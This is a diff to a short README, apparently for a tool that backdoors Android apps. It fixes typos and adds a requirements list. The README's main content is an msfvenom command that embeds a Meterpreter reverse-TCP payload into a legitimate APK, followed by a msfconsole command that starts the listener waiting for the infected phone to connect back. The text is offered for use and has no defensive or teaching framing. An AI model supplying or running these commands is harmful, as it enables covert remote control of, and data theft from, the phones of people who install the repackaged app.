@@ -1,8 +1,15 @@
-Extract the zip file and use this command in same direcotory. 
-Make sure you should chane lport and lhost
+Extract the zip file and use this command in the same directory. 	 
+Make sure you should change lport and lhost
+Requirements 
+You should have Metasploit configure in Kali Linux OS
+wget
+curl
+metasploit
+zipalign
+java8/9
 
 
 msfvenom -x <app.apk> android/meterpreter/reverse_tcp lhost=ip-address lport=port -o payload-name.apk
 
-Start Listner 
+Start Listener 
 msfconsole -q -r '/home/kalio/Downloads/android-meterpreter-stageless-reverse-tcp-4444-apk.rc' 
